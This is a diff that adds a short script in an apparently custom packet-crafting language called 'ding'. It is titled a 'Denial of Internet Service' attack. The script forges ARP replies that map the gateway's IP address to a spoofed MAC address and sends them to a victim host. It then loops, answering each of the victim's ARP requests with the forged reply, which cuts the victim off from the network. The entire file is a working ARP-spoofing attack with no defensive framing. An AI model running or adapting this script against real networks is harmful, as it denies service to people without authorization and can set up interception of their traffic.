@@ -1,0 +1,51 @@
+Denial of Internet Service (dois) attack - ding Implementation
+
+Author - Rishi Tharun (ding project lead)
+
+.decl:
+  packet reply, eth_reply, arp_reply
+
+  string intrface
+  stream victim_request
+  mac spoof_mac, victim_mac
+  ip4 victim_ip4, gateway_ip4
+
+.flow:
+  intrface = "eth0"
+
+  spoof_mac = 08~00~27~a6~1f~86 ! some random mac or the attacker mac
+  victim_mac = 94~e9~79~a3~d8~a7 ! name tells all
+
+  victim_ip4 = 192.168.1.36 ! name tells all
+  gateway_ip4 = 192.168.1.1 ! name tells all
+
+  victim_request = c"ETHER(SRC_MAC = victim_mac, DEST_MAC = spoof_mac) ARP(SRC_MAC = victim_mac, DEST_MAC = spoof_mac, SRC_IP = victim_ip4, DEST_IP = gateway_ip4, OPERATION = 1:2B)"
+
+  reply = container()
+
+  eth_reply = container("ETHER", reply)
+  arp_reply = container("ARP", reply)
+
+  eth_reply.SRC_MAC = spoof_mac
+  eth_reply.DEST_MAC = victim_mac
+  eth_reply.TYPE = x0806
+
+  arp_reply.HW_TYPE = 1:2B
+  arp_reply.PROTO_TYPE = x0800
+  arp_reply.HW_ADDRESS_LEN = 6:1B
+  arp_reply.PROTO_ADDRESS_LEN = 4:1B
+  arp_reply.OPERATION = 2:2B
+  arp_reply.SRC_MAC = spoof_mac
+  arp_reply.SRC_IP = gateway_ip4
+  arp_reply.DEST_MAC = victim_mac
+  arp_reply.DEST_IP = victim_ip4
+
+  interface(intrface)
+
+  send(reply)
+
+  loop(1:1B)
+    print(receive(victim_request))
+    send(reply)
+  endloop
+
